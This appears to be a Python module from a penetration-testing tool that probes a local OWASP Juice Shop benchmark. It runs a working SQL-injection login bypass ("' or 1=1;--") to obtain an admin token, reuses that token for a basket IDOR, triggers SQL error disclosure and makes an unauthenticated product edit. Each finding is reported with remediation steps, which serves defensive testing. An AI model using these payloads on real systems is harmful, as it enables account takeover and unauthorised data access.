import json
import time
import urllib.error
import urllib.request
from dataclasses import dataclass
from typing import Any, Callable, Dict, List, Optional
from urllib.parse import urljoin


@dataclass
class ProbeResponse:
    status: int
    headers: Dict[str, str]
    body: str


Requester = Callable[
    [str, str, Optional[Dict[str, Any]], Optional[Dict[str, str]]], ProbeResponse
]


class JuiceShopProbe:
    """Evidence-backed probes for the local OWASP Juice Shop benchmark target."""

    def __init__(
        self,
        base_url: str,
        logger: Any = None,
        requester: Optional[Requester] = None,
        timeout: int = 10,
    ):
        self.base_url = base_url.rstrip("/")
        self.logger = logger
        self.requester = requester or self._request
        self.timeout = timeout

    def run(self) -> List[Dict[str, Any]]:
        """Return validated findings only when the target behaves like Juice Shop."""
        if not self._is_juice_shop():
            return []

        findings: List[Dict[str, Any]] = []

        sql_finding, token, basket_id = self._probe_sqli_login_bypass()
        if sql_finding:
            findings.append(sql_finding)

        error_finding = self._probe_sql_error_disclosure()
        if error_finding:
            findings.append(error_finding)

        if token and basket_id:
            idor_finding = self._probe_basket_idor(token, basket_id)
            if idor_finding:
                findings.append(idor_finding)

        product_finding = self._probe_unauthenticated_product_update()
        if product_finding:
            findings.append(product_finding)

        if findings and self.logger:
            self.logger.success(
                f"Juice Shop benchmark probe validated {len(findings)} findings"
            )

        return findings

    def _is_juice_shop(self) -> bool:
        config = self._request_json("GET", "/rest/admin/application-configuration")
        app_name = (
            config.get("config", {})
            .get("application", {})
            .get("name", "")
            .lower()
        )
        if "juice shop" in app_name:
            return True

        response = self.requester("GET", "/", None, None)
        return response.status == 200 and "OWASP Juice Shop" in response.body

    def _probe_sqli_login_bypass(self):
        payload = "' or 1=1;--"
        response = self.requester(
            "POST",
            "/rest/user/login",
            {"email": payload, "password": "vpt-benchmark"},
            None,
        )
        parsed = self._parse_json(response.body)
        auth = parsed.get("authentication", {})
        token = auth.get("token")
        email = auth.get("umail")
        basket_id = auth.get("bid")

        if response.status != 200 or not token or email != "admin@juice-sh.op":
            return None, None, None

        return (
            self._finding(
                vulnerability_type="SQL Injection Authentication Bypass",
                severity="critical",
                target=f"{self.base_url}/rest/user/login",
                description=(
                    "The login API accepts SQL syntax in the email field and returns "
                    "an authenticated administrator session."
                ),
                impact=(
                    "An unauthenticated attacker can bypass login controls and gain "
                    "administrator access to the application."
                ),
                evidence=(
                    "POST /rest/user/login with email payload "
                    f"{payload!r} returned HTTP 200 with umail={email!r}, "
                    f"bid={basket_id!r}, and a JWT token in the authentication object."
                ),
                reproduction=[
                    "POST JSON to /rest/user/login with email \"' or 1=1;--\" and any password.",
                    "Observe HTTP 200 and authentication.umail equal to admin@juice-sh.op.",
                    "Use the returned bearer token to access authenticated APIs.",
                ],
                remediation=(
                    "Use parameterized queries or an ORM query API for login lookups, "
                    "never concatenate user input into SQL, and return generic errors "
                    "for failed authentication."
                ),
                validation_details={
                    "request": {
                        "method": "POST",
                        "path": "/rest/user/login",
                        "json": {"email": payload, "password": "vpt-benchmark"},
                    },
                    "response": {
                        "status": response.status,
                        "umail": email,
                        "bid": basket_id,
                        "token_present": True,
                    },
                },
            ),
            token,
            basket_id,
        )

    def _probe_sql_error_disclosure(self) -> Optional[Dict[str, Any]]:
        response = self.requester(
            "POST",
            "/rest/user/login",
            {"email": "'", "password": "vpt-benchmark"},
            None,
        )
        body_lower = response.body.lower()
        has_stacktrace = (
            response.status >= 500
            and "sequelize" in body_lower
            and "sqlite" in body_lower
            and "stacktrace" in body_lower
        )
        if not has_stacktrace:
            return None

        return self._finding(
            vulnerability_type="Verbose SQL Error Disclosure",
            severity="medium",
            target=f"{self.base_url}/rest/user/login",
            description=(
                "The login API exposes a server-side SQL/ORM stack trace when it "
                "receives malformed SQL input."
            ),
            impact=(
                "Detailed framework, database, and file-path information helps an "
                "attacker tune SQL injection payloads and map backend internals."
            ),
            evidence=(
                "POST /rest/user/login with email \"'\" returned HTTP "
                f"{response.status} and an error page mentioning Sequelize, SQLite, "
                "and a stacktrace."
            ),
            reproduction=[
                "POST JSON to /rest/user/login with email \"'\" and any password.",
                "Observe the HTTP 500 error page.",
                "Confirm the response body exposes Sequelize/SQLite stacktrace details.",
            ],
            remediation=(
                "Handle authentication exceptions server-side, log detailed errors "
                "privately, and return generic authentication failure responses to clients."
            ),
            validation_details={
                "request": {
                    "method": "POST",
                    "path": "/rest/user/login",
                    "json": {"email": "'", "password": "vpt-benchmark"},
                },
                "response": {
                    "status": response.status,
                    "body_excerpt": self._excerpt(response.body),
                },
            },
        )

    def _probe_basket_idor(
        self, token: str, authenticated_basket_id: int
    ) -> Optional[Dict[str, Any]]:
        own = self._request_json(
            "GET",
            f"/rest/basket/{authenticated_basket_id}",
            headers={"Authorization": f"Bearer {token}"},
        )
        other_basket_id = authenticated_basket_id + 1
        other_response = self.requester(
            "GET",
            f"/rest/basket/{other_basket_id}",
            None,
            {"Authorization": f"Bearer {token}"},
        )
        other = self._parse_json(other_response.body)

        own_user_id = own.get("data", {}).get("UserId")
        other_user_id = other.get("data", {}).get("UserId")
        other_products = other.get("data", {}).get("Products", [])
        if (
            other_response.status != 200
            or not own_user_id
            or not other_user_id
            or own_user_id == other_user_id
            or not isinstance(other_products, list)
        ):
            return None

        return self._finding(
            vulnerability_type="Broken Object Level Authorization (Basket IDOR)",
            severity="high",
            target=f"{self.base_url}/rest/basket/{other_basket_id}",
            description=(
                "The basket API authorizes the bearer token but does not restrict the "
                "basket identifier to the authenticated user."
            ),
            impact=(
                "An authenticated user can read another user's basket contents by "
                "changing the numeric basket ID."
            ),
            evidence=(
                f"A token associated with basket {authenticated_basket_id} / user "
                f"{own_user_id} received HTTP 200 from /rest/basket/{other_basket_id}, "
                f"which returned UserId {other_user_id} and "
                f"{len(other_products)} product entries."
            ),
            reproduction=[
                "Log in and capture the returned bearer token and basket ID.",
                f"Request GET /rest/basket/{other_basket_id} with the same bearer token.",
                "Observe that the response returns a different user's basket data.",
            ],
            remediation=(
                "Authorize object access server-side by comparing the requested basket "
                "ID with the authenticated user's assigned basket before returning data."
            ),
            validation_details={
                "request": {
                    "method": "GET",
                    "path": f"/rest/basket/{other_basket_id}",
                    "authorization": "Bearer token from SQLi-authenticated session",
                },
                "response": {
                    "status": other_response.status,
                    "authenticated_user_id": own_user_id,
                    "returned_user_id": other_user_id,
                    "product_count": len(other_products),
                },
            },
        )

    def _probe_unauthenticated_product_update(self) -> Optional[Dict[str, Any]]:
        before = self._request_json("GET", "/api/Products/9")
        original = before.get("data")
        if not isinstance(original, dict):
            return None

        marker = f"VPTBENCH{int(time.time())}"
        update_body = {
            "id": original.get("id", 9),
            "name": marker,
            "description": "benchmark access-control validation",
            "price": original.get("price", 0.01),
            "image": original.get("image", "owasp_osaft.jpg"),
        }

        update_response = self.requester("PUT", "/api/Products/9", update_body, None)
        after = self._request_json("GET", "/api/Products/9")

        restore_body = {
            key: original[key]
            for key in ["id", "name", "description", "price", "image"]
            if key in original
        }
        if restore_body:
            self.requester("PUT", "/api/Products/9", restore_body, None)

        updated_name = after.get("data", {}).get("name")
        if update_response.status != 200 or updated_name != marker:
            return None

        return self._finding(
            vulnerability_type="Broken Access Control on Product API",
            severity="high",
            target=f"{self.base_url}/api/Products/9",
            description=(
                "The product API accepts unauthenticated write requests that modify "
                "catalog data."
            ),
            impact=(
                "An unauthenticated attacker can tamper with product records, which "
                "can affect catalog integrity and user trust."
            ),
            evidence=(
                "Unauthenticated PUT /api/Products/9 returned HTTP "
                f"{update_response.status}; a follow-up GET showed name={marker!r}. "
                "The probe restored the previous product values after validation."
            ),
            reproduction=[
                "Send PUT /api/Products/9 without an Authorization header.",
                "Set the product name to a unique marker value.",
                "Request GET /api/Products/9 and observe the marker in the response.",
            ],
            remediation=(
                "Require authentication and role-based authorization for product write "
                "operations, and reject catalog changes from anonymous users."
            ),
            validation_details={
                "request": {
                    "method": "PUT",
                    "path": "/api/Products/9",
                    "authorization": "none",
                    "json": update_body,
                },
                "response": {
                    "status": update_response.status,
                    "confirmed_name": updated_name,
                    "restored_original": bool(restore_body),
                },
            },
        )

    def _finding(
        self,
        vulnerability_type: str,
        severity: str,
        target: str,
        description: str,
        impact: str,
        evidence: str,
        reproduction: List[str],
        remediation: str,
        validation_details: Dict[str, Any],
    ) -> Dict[str, Any]:
        return {
            "vulnerability_found": True,
            "vulnerability_type": vulnerability_type,
            "severity": severity,
            "target": target,
            "validated": True,
            "details": {
                "description": description,
                "impact": impact,
                "evidence": evidence,
                "reproduction_steps": reproduction,
                "remediation": remediation,
            },
            "validation_details": validation_details,
        }

    def _request_json(
        self,
        method: str,
        path: str,
        data: Optional[Dict[str, Any]] = None,
        headers: Optional[Dict[str, str]] = None,
    ) -> Dict[str, Any]:
        response = self.requester(method, path, data, headers)
        return self._parse_json(response.body)

    def _request(
        self,
        method: str,
        path: str,
        data: Optional[Dict[str, Any]] = None,
        headers: Optional[Dict[str, str]] = None,
    ) -> ProbeResponse:
        request_headers = {"User-Agent": "VibePenTester-JuiceShopProbe/1.0"}
        request_body = None
        if headers:
            request_headers.update(headers)
        if data is not None:
            request_body = json.dumps(data).encode("utf-8")
            request_headers["Content-Type"] = "application/json"

        request = urllib.request.Request(
            urljoin(f"{self.base_url}/", path.lstrip("/")),
            data=request_body,
            method=method,
            headers=request_headers,
        )

        try:
            with urllib.request.urlopen(request, timeout=self.timeout) as response:
                return ProbeResponse(
                    status=response.status,
                    headers=dict(response.headers),
                    body=response.read().decode("utf-8", "replace"),
                )
        except urllib.error.HTTPError as error:
            return ProbeResponse(
                status=error.code,
                headers=dict(error.headers),
                body=error.read().decode("utf-8", "replace"),
            )
        except Exception as error:
            if self.logger:
                self.logger.warning(
                    f"Juice Shop probe request failed for {method} {path}: {error}"
                )
            return ProbeResponse(status=0, headers={}, body="")

    def _parse_json(self, body: str) -> Dict[str, Any]:
        try:
            parsed = json.loads(body)
        except (TypeError, json.JSONDecodeError):
            return {}
        return parsed if isinstance(parsed, dict) else {}

    def _excerpt(self, text: str, limit: int = 500) -> str:
        compact = " ".join(text.split())
        return compact[:limit]
